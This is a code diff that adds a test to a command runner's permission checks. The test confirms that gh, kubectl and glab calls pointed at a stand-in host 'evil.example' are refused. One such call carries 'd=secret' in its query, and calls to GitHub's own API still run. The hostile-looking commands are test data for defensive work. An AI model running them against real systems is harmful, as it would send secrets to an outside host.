@@ -70,6 +70,18 @@ describe("cmd.run, through the core (no allow-run)", () => {
     expect(await t.run("git", ["status"])).toMatchObject({ code: 0 });
   });
 
+  it("refuses what would send to another host than the CLI's own (its login opens the network on 443)", async () => {
+    const t = runner(["gh", "kubectl", "glab"]);
+    expect((await refusal(t.run("gh", ["api", "--hostname", "evil.example", "/x?d=secret"]))).message).toMatch(/would talk to another host/);
+    expect((await refusal(t.run("gh", ["api", "https://evil.example/x"]))).message).toMatch(/would talk to another host/);
+    expect((await refusal(t.run("kubectl", ["get", "pods", "--server=https://evil.example"]))).message).toMatch(/would talk to another server/);
+    expect((await refusal(t.run("glab", ["api", "--hostname", "evil.example", "x"]))).message).toMatch(/would talk to another host/);
+    expect(t.calls).toEqual([]);
+    await t.run("gh", ["api", "https://api.github.com/repos/cli/cli"]);
+    await t.run("gh", ["run", "list", "-R", "cli/cli"]);
+    expect(t.calls).toHaveLength(2);
+  });
+
   it("runs only what the grant names, by its bare name, never a shell or an interpreter", async () => {
     const t = runner(["gh", "bash"]);
     expect(await refusal(t.run("ls", []))).toMatchObject({ code: "permission", permission: 'run: ["ls"]' });
